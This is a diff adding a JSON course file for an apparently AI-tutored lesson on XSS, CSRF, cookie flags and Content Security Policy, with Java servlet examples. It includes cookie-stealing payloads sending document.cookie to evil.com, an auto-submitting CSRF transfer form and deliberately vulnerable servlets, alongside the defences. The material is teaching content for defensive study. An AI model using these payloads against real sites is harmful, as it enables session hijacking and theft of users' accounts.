@@ -1,0 +1,1612 @@
+{
+  "course_id": "xss_web_security",
+  "title": "XSS & Web Security",
+  "description": "Master Cross-Site Scripting attacks, CSRF protection, session management, and Content Security Policy to build secure web applications",
+  "difficulty": "INTERMEDIATE",
+  "estimated_hours": 10,
+  "prerequisites": [
+    "java_syntax_output",
+    "java_methods",
+    "java_classes_objects",
+    "exceptions_security",
+    "sql_injection"
+  ],
+  "learning_outcomes": [
+    "Explain how web applications work: HTTP requests, responses, cookies, and sessions",
+    "Distinguish between Reflected XSS, Stored XSS, and DOM-based XSS",
+    "Demonstrate cookie theft using XSS with document.cookie",
+    "Trace step by step how an XSS payload executes in the browser",
+    "Implement server-side output encoding to prevent XSS",
+    "Write client-side input sanitisation using regex and DOMPurify",
+    "Understand Cross-Site Request Forgery (CSRF) and how it differs from XSS",
+    "Implement CSRF token generation, embedding, and validation in Java servlets",
+    "Configure secure session management: HttpOnly, Secure, SameSite cookie flags",
+    "Write Content Security Policy (CSP) headers to block inline script execution",
+    "Recognise CWE-79 (XSS), CWE-352 (CSRF), and CWE-614 (Sensitive Cookie Without Secure Flag)",
+    "Analyse real-world XSS breaches and their impact"
+  ],
+  "neurodivergent_design": {
+    "visual_first": true,
+    "analogy_based": true,
+    "progressive_difficulty": true,
+    "colour_coded_sections": true,
+    "short_focused_exercises": true,
+    "immediate_feedback": true,
+    "multiple_explanation_styles": true,
+    "estimated_focus_time_per_exercise": "3-7 minutes"
+  },
+  "ai_tutor_config": {
+    "personality": "Encouraging, patient, uses postal and letter analogies. Never judges mistakes - web security is complex! Celebrates every vulnerability spotted and every defence built. Explains using side-by-side comparisons of vulnerable vs secure code.",
+    "intervention_triggers": {
+      "idle_40_seconds": "Hey there! XSS can be confusing because it involves TWO sides: the server that builds the page and the browser that renders it. Think of it like a letter: the server writes the letter, but if an attacker slips extra instructions into the letter, the browser follows them. Want me to walk through the letter analogy?",
+      "idle_90_seconds": "Still working on it? No worries - XSS is one of the trickiest web vulnerabilities because you need to understand HTML, JavaScript, AND server-side code. Would you like me to: (A) Show how the attack works with a simple diagram, (B) Trace the payload character by character, or (C) Compare vulnerable vs secure code side by side?",
+      "idle_180_seconds": "Take your time! Here is the core idea: XSS happens when the server puts user input directly into an HTML page without cleaning it. If the input contains <script> tags, the browser runs them as real code. The fix is to ENCODE the special characters so < becomes &lt; and the browser shows it as text instead of running it as code. Ready to try a simpler exercise?",
+      "first_error": "Good try! XSS payloads need to match the HTML context they are injected into. Check: is your input going inside an HTML tag, an attribute, or a script block? Each needs a different approach. Try again!",
+      "repeated_errors": "No problem at all! Let me break this down. Step 1: Where does user input appear in the HTML page? Step 2: What characters are dangerous in that context? Step 3: How can you encode those characters? Let us go through each step together.",
+      "after_success": "Excellent work! You just demonstrated how an attacker can steal cookies, deface websites, or hijack sessions through XSS. Now you understand WHY output encoding is essential. You are building real security skills!"
+    },
+    "encouragement_phrases": [
+      "XSS is the most common web vulnerability - mastering it puts you ahead of most developers!",
+      "You are thinking about both the attacker AND defender perspective - that is the key!",
+      "Great catch! That unescaped output is exactly where XSS lives!",
+      "Remember: if user input appears on a page without encoding, XSS is possible.",
+      "Every major website has been hit by XSS at some point - even Google and Facebook!",
+      "The browser trusts everything the server sends. That trust is what attackers exploit.",
+      "You spotted the missing encoding - that is exactly what a security auditor would find!",
+      "CSRF and XSS are a dangerous combination. Understanding both makes you powerful!",
+      "Take a breath if needed. Web security has many layers - we will master them all.",
+      "Each exercise makes you better at protecting real users from real attacks!"
+    ],
+    "explanation_styles": {
+      "analogy": "XSS is like a postal service: You send a letter (HTTP request) to a company (web server). The company writes a reply (HTML page) and includes something you wrote in the letter. Normally this is fine - they include your name on the reply. But what if you wrote fake instructions in your letter that look like they came from the company? The person reading the reply (browser) cannot tell which parts the company wrote and which parts came from you. They follow ALL the instructions - including your malicious ones.",
+      "visual": "VULNERABLE: Server builds HTML with user input directly: '<p>Hello ' + username + '</p>'. If username = '<script>alert(1)</script>', the browser sees a real script tag and RUNS it. SECURE: Server ENCODES the input first: '<p>Hello ' + encode(username) + '</p>'. The < becomes &lt; and the browser shows it as TEXT, not code.",
+      "step_by_step": "Step 1: Attacker crafts a URL or form input containing JavaScript code. Step 2: The server includes this input in the HTML response WITHOUT encoding. Step 3: The victim's browser receives the page and sees a <script> tag. Step 4: The browser trusts the page (it came from the legitimate server) and RUNS the script. Step 5: The script steals the victim's cookies and sends them to the attacker.",
+      "code_trace": "Input: <script>document.location='http://evil.com?c='+document.cookie</script>. Server code: out.println('Welcome ' + input). HTML becomes: Welcome <script>document.location='http://evil.com?c='+document.cookie</script>. Browser: runs the script, redirects to evil.com with cookies in the URL. Attacker: reads cookies from their server log. Game over.",
+      "comparison": "XSS = Attacker injects code that runs in the VICTIM's browser. CSRF = Attacker tricks the victim's browser into making a REQUEST the victim did not intend. XSS steals data FROM the page. CSRF makes the browser DO something on another site."
+    }
+  },
+  "lessons": [
+    {
+      "lesson_id": "xss_web_security_lesson_1",
+      "title": "XSS & Web Security - From Browser Basics to Defence Mastery",
+      "theory": {
+        "introduction": "Imagine you receive a letter from your bank. You trust it because it has the bank's letterhead, logo, and came in an official envelope. You follow the instructions in the letter - you call the phone number, you visit the website link, you enter your details. But what if someone had intercepted the letter before it reached you and slipped in an extra page with fake instructions? You would follow those too, because you believe the WHOLE letter came from the bank.\n\nThis is exactly how Cross-Site Scripting (XSS) works. A web server sends an HTML page to your browser. Your browser trusts EVERYTHING in that page because it came from the legitimate server. But if an attacker managed to inject malicious JavaScript code into that page, your browser runs it with full trust - it can read your cookies, redirect you to fake websites, modify what you see on the screen, or make requests on your behalf.\n\nXSS (CWE-79) has been in the OWASP Top 10 for over 20 years. It is the MOST COMMON web vulnerability, found in approximately 75% of all web applications. Major companies including Google, Facebook, Twitter, and Yahoo have all had XSS vulnerabilities discovered in their products. The MySpace Samy worm (2005) infected over one million profiles in just 20 hours using stored XSS.\n\nIn this topic, you will learn the three types of XSS (Reflected, Stored, and DOM-based), how to steal session cookies, how Cross-Site Request Forgery (CSRF) works alongside XSS, how to protect sessions with HttpOnly and Secure flags, and how Content Security Policy (CSP) provides an additional defence layer. By the end, you will be able to find, exploit, and fix the most common web security vulnerabilities.",
+        "why_important": "XSS directly impacts users - it runs in THEIR browser, steals THEIR data, and acts as THEM. Unlike SQL injection which attacks the server, XSS attacks the people using the website. A single XSS vulnerability on a banking site could let an attacker transfer money from every user who visits a compromised page. The British Airways XSS-related breach exposed 380,000 payment card details. Understanding XSS, CSRF, and session security is essential for anyone building web applications - which is nearly every developer today.",
+        "key_concepts": [
+          {
+            "concept": "How the Web Works: HTTP, HTML, and the Browser",
+            "explanation": "Before understanding XSS, you need to understand how web pages work. When you type a URL or click a link, your browser sends an HTTP REQUEST to a web server. The server processes the request, builds an HTML page, and sends it back as an HTTP RESPONSE. Your browser then RENDERS (displays) the HTML.\n\nThe HTML page can contain text, images, links, forms, CSS styling, and crucially - JavaScript code in <script> tags. The browser runs ALL JavaScript it finds in the page. It trusts the page completely because it came from the server.\n\nHTTP is stateless - the server does not remember you between requests. To solve this, servers use COOKIES - small pieces of data stored in your browser. The most important cookie is the SESSION ID (often called JSESSIONID in Java). This cookie proves who you are. If an attacker steals your session cookie, they can impersonate you.",
+            "example": "// HTTP Request (what your browser sends):\n// GET /search?q=laptop HTTP/1.1\n// Host: shop.com\n// Cookie: JSESSIONID=abc123xyz\n\n// HTTP Response (what the server sends back):\n// HTTP/1.1 200 OK\n// Content-Type: text/html\n// Set-Cookie: JSESSIONID=abc123xyz; HttpOnly; Secure\n//\n// <html>\n//   <body>\n//     <h1>Search Results for: laptop</h1>\n//     <p>Found 42 products</p>\n//   </body>\n// </html>\n\n// Your browser: renders the HTML, shows \"Search Results for: laptop\"\n// The cookie JSESSIONID proves you are logged in",
+            "ai_hint": "The browser runs everything in <script> tags. If an attacker gets JavaScript into the HTML, the browser runs it as trusted code."
+          },
+          {
+            "concept": "What is Cross-Site Scripting (XSS)?",
+            "explanation": "Cross-Site Scripting (XSS) happens when a web application includes user-supplied data in an HTML page WITHOUT properly encoding or validating it. If the user input contains HTML tags or JavaScript code, the browser treats it as REAL code and executes it.\n\nThe name 'Cross-Site' comes from the fact that the attacker's code runs in the CONTEXT of the vulnerable website. Because of the browser's Same-Origin Policy, JavaScript can only access cookies and data from the site it appears to come from. So if the attacker's script runs on bank.com's page, it can access bank.com's cookies - including the session ID.\n\nThere are three types:\n1. REFLECTED XSS - The malicious input comes from the URL/request and is immediately reflected back in the response\n2. STORED XSS - The malicious input is saved in the database and served to every user who views that data\n3. DOM-BASED XSS - The vulnerability is in client-side JavaScript that modifies the page DOM using untrusted data\n\nAll three types have the same root cause: user input is treated as code instead of data.",
+            "example": "// NORMAL use of a search page:\n// URL: http://shop.com/search?q=laptop\n// Server: out.println(\"You searched for: \" + query);\n// HTML: <p>You searched for: laptop</p>\n// Browser: shows text \"You searched for: laptop\"\n\n// XSS ATTACK on the same page:\n// URL: http://shop.com/search?q=<script>alert(document.cookie)</script>\n// Server: out.println(\"You searched for: \" + query);\n// HTML: <p>You searched for: <script>alert(document.cookie)</script></p>\n// Browser: finds <script> tag, RUNS it, shows alert with cookies!\n\n// THE ROOT CAUSE:\n// The server used: out.println(\"You searched for: \" + query);\n// It should have used: out.println(\"You searched for: \" + encode(query));",
+            "ai_hint": "XSS happens because the server puts raw user input into HTML. The browser cannot tell the difference between the developer's code and the attacker's injected code."
+          },
+          {
+            "concept": "Reflected XSS (The URL Attack)",
+            "explanation": "Reflected XSS is the most common type. The attack payload is embedded in a URL or form submission, sent to the server, and immediately 'reflected' back in the HTML response. The server does not store the payload - it only appears in that one response.\n\nThe attack flow:\n1. Attacker crafts a malicious URL: http://shop.com/search?q=<script>steal()</script>\n2. Attacker sends this URL to the victim (via email, social media, or a fake link)\n3. Victim clicks the link, browser sends request to shop.com\n4. Server includes the search query in the response HTML without encoding\n5. Victim's browser receives the page and runs the attacker's script\n6. Script steals session cookie and sends it to the attacker\n\nThe victim trusts the link because it goes to shop.com - a legitimate website. They do not notice the malicious code in the URL (especially if it is URL-encoded). The server is the middleman: it receives the payload and passes it straight to the victim's browser.",
+            "example": "// STEP-BY-STEP REFLECTED XSS:\n\n// 1. Attacker crafts URL:\n// http://shop.com/search?q=%3Cscript%3Edocument.location%3D\n// %27http%3A%2F%2Fevil.com%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E\n// (URL-encoded version of <script>document.location=...)\n\n// 2. Victim clicks link, browser sends:\n// GET /search?q=<script>document.location='http://evil.com?c='+document.cookie</script>\n\n// 3. Vulnerable Java Servlet:\nString query = request.getParameter(\"q\");\nout.println(\"<h1>Results for: \" + query + \"</h1>\");\n\n// 4. HTML sent to victim:\n// <h1>Results for: <script>document.location='http://evil.com?c='+document.cookie</script></h1>\n\n// 5. Victim's browser RUNS the script!\n// Browser redirects to: http://evil.com?c=JSESSIONID=abc123xyz\n\n// 6. Attacker reads the cookie from their server log\n// Now they can impersonate the victim!",
+            "ai_hint": "Reflected XSS is a one-time attack through a crafted URL. The payload travels: URL -> Server -> HTML response -> Victim's browser."
+          },
+          {
+            "concept": "Stored (Persistent) XSS (The Database Attack)",
+            "explanation": "Stored XSS is MORE dangerous than reflected because the payload is saved in the database and served to EVERY user who views the affected page. The attacker does not need to trick each victim into clicking a special link - any visitor is automatically attacked.\n\nThe attack flow:\n1. Attacker posts a comment containing: <script>steal cookies</script>\n2. Server saves the comment to the database (without sanitising)\n3. Any user who views the comment page gets the script in their browser\n4. The script runs automatically and steals EVERY viewer's session cookie\n\nThe classic example is the MySpace Samy worm (2005). A user named Samy Kamkar posted a profile containing JavaScript that: (1) Added Samy as a friend of anyone who viewed his profile, (2) Copied the worm to the viewer's own profile. In 20 hours, over one million MySpace profiles were infected. Each infected profile then infected its own visitors, creating exponential spread.\n\nStored XSS in a forum, comment section, user profile, or any shared content can affect thousands of users from a single injection.",
+            "example": "// STORED XSS ATTACK FLOW:\n\n// 1. Attacker submits a comment:\nString comment = \"Nice article! <script>\" +\n    \"new Image().src='http://evil.com?c='+document.cookie\" +\n    \"</script>\";\n// Server saves to database: INSERT INTO comments VALUES (..., comment)\n\n// 2. Later, ANY user views the comments page:\n// Server reads from database:\nResultSet rs = stmt.executeQuery(\"SELECT comment FROM comments\");\nwhile (rs.next()) {\n    out.println(\"<p>\" + rs.getString(\"comment\") + \"</p>\");\n}\n\n// 3. HTML sent to EVERY visitor:\n// <p>Nice article! <script>new Image().src='http://evil.com?c='+document.cookie</script></p>\n\n// 4. Every visitor's browser runs the script!\n// Every visitor's cookies sent to evil.com\n// Attacker collects sessions from ALL visitors",
+            "ai_hint": "Stored XSS is like poisoning the water supply - everyone who drinks (visits the page) is affected. Reflected XSS is like poisoning one person's glass."
+          },
+          {
+            "concept": "DOM-Based XSS (The Client-Side Attack)",
+            "explanation": "DOM-based XSS is different from reflected and stored because the vulnerability is in the CLIENT-SIDE JavaScript, not the server. The server may send a perfectly safe HTML page, but the JavaScript on that page reads data from an untrusted source (like the URL fragment) and inserts it into the page unsafely.\n\nThe DOM (Document Object Model) is the browser's internal representation of the HTML page. JavaScript can modify the DOM to change what the user sees. If JavaScript reads user input from location.hash, document.referrer, or URL parameters and writes it to the page using innerHTML or document.write, it creates a DOM-based XSS vulnerability.\n\nThe danger: because the payload never goes to the server, server-side defences like output encoding and WAFs do not help. The attack happens entirely in the browser.",
+            "example": "// DOM-BASED XSS EXAMPLE:\n\n// Safe HTML from server:\n// <html>\n// <body>\n//   <div id=\"welcome\"></div>\n//   <script>\n//     var name = location.hash.substring(1);\n//     document.getElementById('welcome').innerHTML = \n//       'Hello, ' + name + '!';\n//   </script>\n// </body>\n// </html>\n\n// Normal use:\n// URL: http://site.com/page#Alice\n// Page shows: Hello, Alice!\n\n// Attack:\n// URL: http://site.com/page#<img src=x onerror=alert(document.cookie)>\n// JavaScript reads the hash, inserts it via innerHTML\n// Browser renders the <img> tag, triggers onerror, runs alert!\n\n// THE FIX: Use textContent instead of innerHTML\n// document.getElementById('welcome').textContent = 'Hello, ' + name + '!';\n// textContent treats EVERYTHING as text, never as HTML",
+            "ai_hint": "DOM XSS happens in the browser's JavaScript. The fix: use textContent (safe) instead of innerHTML (dangerous) when inserting user data."
+          },
+          {
+            "concept": "Cookie Theft: The Real Danger of XSS",
+            "explanation": "The most dangerous thing an attacker can do with XSS is steal session cookies. The session cookie (typically JSESSIONID in Java) is what proves your identity to the server. If an attacker has your session cookie, they can impersonate you completely - access your account, make purchases, change your password, read your messages.\n\nThe attack: <script>new Image().src='http://evil.com/steal?c='+document.cookie</script>\n\nHow it works:\n1. document.cookie returns all cookies for the current site\n2. new Image().src makes the browser load an 'image' from the attacker's server\n3. The cookies are sent as part of the URL\n4. The attacker's server logs the URL and extracts the cookies\n5. The attacker uses the stolen JSESSIONID to hijack the session\n\nThis is why the HttpOnly flag is critical - it prevents JavaScript from accessing the cookie at all. With HttpOnly set, document.cookie does not return the session ID, and the XSS attack cannot steal it.",
+            "example": "// Cookie theft payload:\n<script>\n  var img = new Image();\n  img.src = 'http://evil.com/steal?cookie=' + document.cookie;\n</script>\n\n// What happens:\n// 1. document.cookie = \"JSESSIONID=abc123; theme=dark\"\n// 2. Browser requests: http://evil.com/steal?cookie=JSESSIONID=abc123;theme=dark\n// 3. Attacker's server logs: \"Got cookie: JSESSIONID=abc123\"\n// 4. Attacker sets their own cookie: JSESSIONID=abc123\n// 5. Attacker visits the site -> server sees abc123 -> treats them as the victim!\n\n// DEFENCE: HttpOnly flag\n// Set-Cookie: JSESSIONID=abc123; HttpOnly\n// Now document.cookie does NOT return JSESSIONID\n// The XSS script gets: \"theme=dark\" (no session cookie!)\n// Session hijacking BLOCKED!",
+            "ai_hint": "HttpOnly is the cookie's bodyguard - it prevents JavaScript from reading the cookie, even if XSS exists."
+          },
+          {
+            "concept": "Output Encoding: The Primary XSS Defence",
+            "explanation": "Output encoding (also called escaping) is the PRIMARY defence against XSS. It converts dangerous HTML characters into their safe entity equivalents so the browser displays them as TEXT instead of interpreting them as HTML/JavaScript.\n\nThe key encodings:\n- < becomes &lt; (prevents opening HTML tags)\n- > becomes &gt; (prevents closing HTML tags)\n- \" becomes &quot; (prevents breaking out of attributes)\n- ' becomes &#x27; (prevents breaking out of attributes)\n- & becomes &amp; (prevents starting entity references)\n\nWith these encodings, <script>alert(1)</script> becomes &lt;script&gt;alert(1)&lt;/script&gt;. The browser shows the literal text '<script>alert(1)</script>' on the screen instead of running it as code.\n\nCRITICAL: You must encode at OUTPUT time (when putting data into HTML), not at INPUT time. Data stored in the database should be raw - you encode when displaying it. This is because the same data might be used in different contexts (HTML, JavaScript, CSS, URL) that each need different encoding.",
+            "example": "// Java output encoding:\npublic static String encodeHTML(String input) {\n    if (input == null) return \"\";\n    return input\n        .replace(\"&\", \"&amp;\")   // Must be FIRST!\n        .replace(\"<\", \"&lt;\")\n        .replace(\">\", \"&gt;\")\n        .replace(\"\\\"\", \"&quot;\")\n        .replace(\"'\", \"&#x27;\");\n}\n\n// VULNERABLE:\nout.println(\"<p>Hello, \" + username + \"</p>\");\n// If username = <script>alert(1)</script>\n// HTML: <p>Hello, <script>alert(1)</script></p>\n// Browser: RUNS the script!\n\n// SECURE:\nout.println(\"<p>Hello, \" + encodeHTML(username) + \"</p>\");\n// If username = <script>alert(1)</script>\n// HTML: <p>Hello, &lt;script&gt;alert(1)&lt;/script&gt;</p>\n// Browser: shows text \"<script>alert(1)</script>\"",
+            "ai_hint": "Think of encoding as putting user input in a display case - everyone can SEE it but nobody can TOUCH it. The browser shows the text but never runs it as code."
+          },
+          {
+            "concept": "Cross-Site Request Forgery (CSRF)",
+            "explanation": "CSRF is a different attack from XSS but often works alongside it. In a CSRF attack, the attacker tricks the victim's browser into making a REQUEST to a website where the victim is already logged in. The browser automatically includes the session cookie, so the server thinks it is a legitimate request from the victim.\n\nExample: You are logged into your bank (bank.com). The attacker's website contains a hidden form that automatically submits a transfer request to bank.com. When you visit the attacker's page, your browser submits the form with your bank.com session cookie attached. The bank sees a valid session and processes the transfer.\n\nThe key difference from XSS:\n- XSS: Attacker injects code that runs IN the trusted site's page\n- CSRF: Attacker makes the victim's browser send a REQUEST TO the trusted site\n\nCSRF exploits the fact that browsers automatically attach cookies to every request for a domain, even if the request originated from a different site.",
+            "example": "// CSRF ATTACK:\n// 1. Victim is logged into bank.com (has JSESSIONID cookie)\n\n// 2. Victim visits attacker's page, which contains:\n// <html>\n// <body onload=\"document.forms[0].submit()\">\n//   <form action=\"https://bank.com/transfer\" method=\"POST\">\n//     <input type=\"hidden\" name=\"to\" value=\"attacker_account\">\n//     <input type=\"hidden\" name=\"amount\" value=\"10000\">\n//   </form>\n// </body>\n// </html>\n\n// 3. The form auto-submits to bank.com\n// Browser adds JSESSIONID cookie automatically!\n// Bank sees: valid session, transfers 10000 to attacker\n\n// DEFENCE: CSRF Token\n// Server generates a random token and includes it in the form:\n// <input type=\"hidden\" name=\"csrf_token\" value=\"a2vM9jT1w\">\n// Server validates the token matches the session\n// Attacker cannot guess the token -> CSRF blocked!",
+            "ai_hint": "CSRF is like someone forging a signed cheque using your signature (session cookie). CSRF tokens are like adding a one-time PIN that only you know."
+          },
+          {
+            "concept": "CSRF Token Implementation in Java",
+            "explanation": "CSRF tokens work by requiring a secret, unpredictable value in every state-changing request. The server generates a random token, stores it in the session, and embeds it in every form as a hidden field. When the form is submitted, the server checks that the token matches.\n\nThe attacker cannot include the correct token because:\n1. The token is random and unpredictable\n2. The Same-Origin Policy prevents the attacker's site from reading the victim's pages on the target site\n3. Each session has a different token\n\nImplementation steps:\n1. Generate: Create a cryptographically random token (SecureRandom + Base64)\n2. Store: Save it in the user's HTTP session\n3. Embed: Include it as a hidden field in every form\n4. Validate: On form submission, compare the submitted token with the stored token\n5. Reject: If tokens do not match or are missing, reject the request",
+            "example": "// Step 1: Token Generator utility class\nimport java.security.SecureRandom;\nimport java.util.Base64;\n\npublic class CSRFTokenGenerator {\n    public static String generate() {\n        SecureRandom random = new SecureRandom();\n        byte[] bytes = new byte[32];\n        random.nextBytes(bytes);\n        return Base64.getUrlEncoder().encodeToString(bytes);\n    }\n}\n\n// Step 2: Generate + store in session (in doGet):\nString token = CSRFTokenGenerator.generate();\nrequest.getSession().setAttribute(\"csrf_token\", token);\n\n// Step 3: Embed in form:\nout.println(\"<form action='/transfer' method='POST'>\");\nout.println(\"<input type='hidden' name='csrf_token' value='\" + token + \"'>\");\nout.println(\"Amount: <input name='amount'>\");\nout.println(\"<button>Transfer</button></form>\");\n\n// Step 4: Validate in doPost:\nString sessionToken = (String) request.getSession().getAttribute(\"csrf_token\");\nString formToken = request.getParameter(\"csrf_token\");\nif (sessionToken == null || !sessionToken.equals(formToken)) {\n    response.sendError(403, \"Invalid request\");\n    return;\n}",
+            "ai_hint": "CSRF tokens are like a secret handshake between the server and your form. The attacker's fake form does not know the handshake."
+          },
+          {
+            "concept": "Session Management: HttpOnly, Secure, SameSite",
+            "explanation": "Session cookies need three security flags to be protected:\n\n1. HttpOnly: Prevents JavaScript from accessing the cookie. Even if XSS exists, document.cookie cannot read the session ID. This blocks cookie theft via XSS.\n\n2. Secure: The cookie is only sent over HTTPS connections. This prevents attackers from intercepting the cookie on unsecured Wi-Fi (Man-in-the-Middle attacks).\n\n3. SameSite: Controls when the cookie is sent with cross-site requests.\n   - Strict: Cookie is NEVER sent with cross-site requests (strongest protection against CSRF)\n   - Lax: Cookie is sent with top-level navigation (clicking a link) but NOT with form submissions or AJAX from other sites\n   - None: Cookie is always sent (requires Secure flag)\n\nIn Java, you set these flags on the session cookie when the user logs in. Without these flags, your session is vulnerable to XSS cookie theft, network interception, and CSRF attacks.",
+            "example": "// Setting secure cookie flags in Java Servlet:\n\npublic void doPost(HttpServletRequest req, HttpServletResponse resp) {\n    // After successful authentication:\n    HttpSession session = req.getSession(true);\n    session.setAttribute(\"user\", authenticatedUser);\n    \n    // Find and secure the JSESSIONID cookie\n    Cookie[] cookies = req.getCookies();\n    if (cookies != null) {\n        for (Cookie cookie : cookies) {\n            if (\"JSESSIONID\".equals(cookie.getName())) {\n                cookie.setHttpOnly(true);   // Block JavaScript access\n                cookie.setSecure(true);     // HTTPS only\n                cookie.setPath(\"/\");        // Valid for entire site\n                cookie.setMaxAge(1800);     // 30 minute timeout\n                resp.addCookie(cookie);\n            }\n        }\n    }\n    \n    // Also set via response header for SameSite:\n    resp.setHeader(\"Set-Cookie\", \n        \"JSESSIONID=\" + session.getId() \n        + \"; HttpOnly; Secure; SameSite=Strict; Path=/\");\n}",
+            "ai_hint": "HttpOnly = no JavaScript access. Secure = HTTPS only. SameSite = no cross-site sending. Use ALL THREE on session cookies."
+          },
+          {
+            "concept": "Content Security Policy (CSP)",
+            "explanation": "Content Security Policy is an HTTP header that tells the browser WHICH sources of content are allowed on the page. Even if an attacker injects a <script> tag via XSS, the browser will refuse to run it if CSP does not allow inline scripts.\n\nKey CSP directives:\n- script-src: Which sources can provide JavaScript\n- style-src: Which sources can provide CSS\n- img-src: Which sources can provide images\n- default-src: Fallback for all resource types\n- connect-src: Which URLs can be connected to via AJAX/fetch\n\nCommon values:\n- 'self': Only from the same origin (your own domain)\n- 'none': Block everything of this type\n- 'nonce-abc123': Only scripts with matching nonce attribute\n- https://cdn.example.com: Only from this specific domain\n\nThe most important rule: script-src 'self' blocks ALL inline scripts. This means even if an attacker injects <script>alert(1)</script>, the browser refuses to run it because it is inline (not from a file on your domain). This is a powerful second line of defence after output encoding.",
+            "example": "// Setting CSP in Java Servlet:\nresponse.setHeader(\"Content-Security-Policy\",\n    \"default-src 'self'; \" +\n    \"script-src 'self' https://cdn.example.com; \" +\n    \"style-src 'self' 'unsafe-inline'; \" +\n    \"img-src *; \" +\n    \"connect-src 'self'\");\n\n// What this policy does:\n// default-src 'self'    -> Only load resources from our domain\n// script-src 'self' cdn -> Scripts only from our domain or our CDN\n// style-src 'self' unsafe-inline -> Styles from us + inline styles OK\n// img-src *             -> Images from anywhere (flexible)\n// connect-src 'self'    -> AJAX only to our own server\n\n// XSS BLOCKED by CSP:\n// Attacker injects: <script>alert(1)</script>\n// Browser: \"This is an inline script. CSP says script-src 'self'.\n//           Inline scripts are NOT from 'self'. BLOCKED.\"\n// Console: Refused to execute inline script (CSP violation)",
+            "ai_hint": "CSP is like a bouncer at a club with a guest list. Only scripts from approved sources get in. Inline scripts injected by attackers are NOT on the list."
+          },
+          {
+            "concept": "Client-Side Input Sanitisation",
+            "explanation": "While server-side output encoding is the PRIMARY defence, adding client-side sanitisation provides an extra layer of protection. In JavaScript, you should sanitise user input before inserting it into the DOM.\n\nSafe methods (treat input as TEXT):\n- element.textContent = userInput (SAFE - never interprets HTML)\n- element.innerText = userInput (SAFE - never interprets HTML)\n\nDangerous methods (treat input as HTML):\n- element.innerHTML = userInput (DANGEROUS - parses and executes HTML)\n- document.write(userInput) (DANGEROUS - injects into document)\n- eval(userInput) (EXTREMELY DANGEROUS - executes as JavaScript)\n\nIf you MUST use innerHTML (rare cases), sanitise first using:\n1. A regex to strip dangerous tags: input.replace(/<script[^>]*>[\\s\\S]*?<\\/script>/gi, '')\n2. A library like DOMPurify: DOMPurify.sanitize(input)\n3. The browser's built-in sanitiser API (newer browsers)",
+            "example": "// DANGEROUS - innerHTML with raw input:\nvar userInput = '<img src=x onerror=alert(document.cookie)>';\ndocument.getElementById('output').innerHTML = userInput;\n// Browser creates the img tag, triggers onerror, runs alert!\n\n// SAFE - textContent instead:\ndocument.getElementById('output').textContent = userInput;\n// Browser shows literal text: <img src=x onerror=alert(document.cookie)>\n// Nothing executes!\n\n// JavaScript sanitisation function:\nfunction sanitizeInput(input) {\n    return input\n        .replace(/&/g, '&amp;')\n        .replace(/</g, '&lt;')\n        .replace(/>/g, '&gt;')\n        .replace(/\"/g, '&quot;')\n        .replace(/'/g, '&#x27;');\n}\n\n// Using regex to strip script tags:\nfunction stripScripts(input) {\n    return input.replace(/<script[^>]*>[\\\\s\\\\S]*?<\\\\/script>/gi, '');\n}",
+            "ai_hint": "textContent = SAFE (always text). innerHTML = DANGEROUS (interprets HTML). When in doubt, use textContent."
+          },
+          {
+            "concept": "CWE-79, CWE-352, CWE-614: The Web Security CWEs",
+            "explanation": "Understanding CWE (Common Weakness Enumeration) numbers helps you communicate precisely about web security vulnerabilities.\n\nCWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting). Covers all three XSS types. Root cause: user input included in HTML without encoding.\n\nCWE-352: Cross-Site Request Forgery (CSRF). Covers attacks where the victim's browser is tricked into making unwanted requests. Root cause: server relies only on cookies for authentication without additional token verification.\n\nCWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute. The session cookie can be sent over unencrypted HTTP, allowing interception.\n\nCWE-1004: Sensitive Cookie Without 'HttpOnly' Flag. JavaScript can access the session cookie, enabling theft via XSS.\n\nCWE-16: Configuration (related to missing security headers like CSP).\n\nThese CWEs are referenced in security reports, vulnerability disclosures, and compliance standards like PCI-DSS.",
+            "example": "// CWE-79: XSS\n// VULNERABLE: out.println(\"Hello \" + userInput);\n// FIX: out.println(\"Hello \" + encode(userInput));\n\n// CWE-352: CSRF  \n// VULNERABLE: No token validation on state-changing requests\n// FIX: Generate, embed, and validate CSRF tokens\n\n// CWE-614: Cookie without Secure flag\n// VULNERABLE: Set-Cookie: JSESSIONID=abc123\n// FIX: Set-Cookie: JSESSIONID=abc123; Secure\n\n// CWE-1004: Cookie without HttpOnly\n// VULNERABLE: Set-Cookie: JSESSIONID=abc123\n// FIX: Set-Cookie: JSESSIONID=abc123; HttpOnly\n\n// A FULLY SECURE cookie:\n// Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Strict; Path=/\n// This cookie is protected against:\n//   XSS cookie theft (HttpOnly)\n//   Network interception (Secure)\n//   CSRF (SameSite=Strict)",
+            "ai_hint": "CWE-79 = XSS, CWE-352 = CSRF, CWE-614 = insecure cookie. Know these numbers for security reports."
+          }
+        ]
+      },
+      "complete_examples": [
+        {
+          "title": "Example 1: Reflected XSS in a Search Page",
+          "description": "A search page that reflects user input directly into HTML without encoding. We trace the attack step by step.",
+          "difficulty": "beginner",
+          "code": "// Vulnerable Java Servlet:\nimport javax.servlet.http.*;\nimport java.io.*;\n\npublic class SearchServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp)\n            throws IOException {\n        resp.setContentType(\"text/html\");\n        PrintWriter out = resp.getWriter();\n        String query = req.getParameter(\"q\");\n        \n        out.println(\"<html><body>\");\n        out.println(\"<h1>Search Results</h1>\");\n        // VULNERABLE: query goes straight into HTML!\n        out.println(\"<p>You searched for: \" + query + \"</p>\");\n        out.println(\"</body></html>\");\n    }\n}\n\n// Normal request:\n// GET /search?q=laptop\n// HTML: <p>You searched for: laptop</p>\n// Browser: shows text 'You searched for: laptop'\n\n// XSS Attack:\n// GET /search?q=<script>alert(document.cookie)</script>\n// HTML: <p>You searched for: <script>alert(document.cookie)</script></p>\n// Browser: RUNS the script, shows alert with cookies!",
+          "output": "Normal: Shows 'You searched for: laptop' (text only)\nAttack: Browser executes <script>alert(document.cookie)</script>\n        Alert box appears showing JSESSIONID cookie value!",
+          "ai_explanation": "The servlet takes the 'q' parameter and puts it directly into the HTML response using string concatenation. When the input is normal text like 'laptop', this works fine. But when the input contains HTML tags like <script>, the browser treats them as REAL HTML/JavaScript and executes them. The fix: encode the query before outputting it.",
+          "ai_challenge": "Try changing the payload to steal cookies silently: <script>new Image().src='http://evil.com?c='+document.cookie</script>. This sends cookies to the attacker without the user seeing anything."
+        },
+        {
+          "title": "Example 2: Secure Search with Output Encoding",
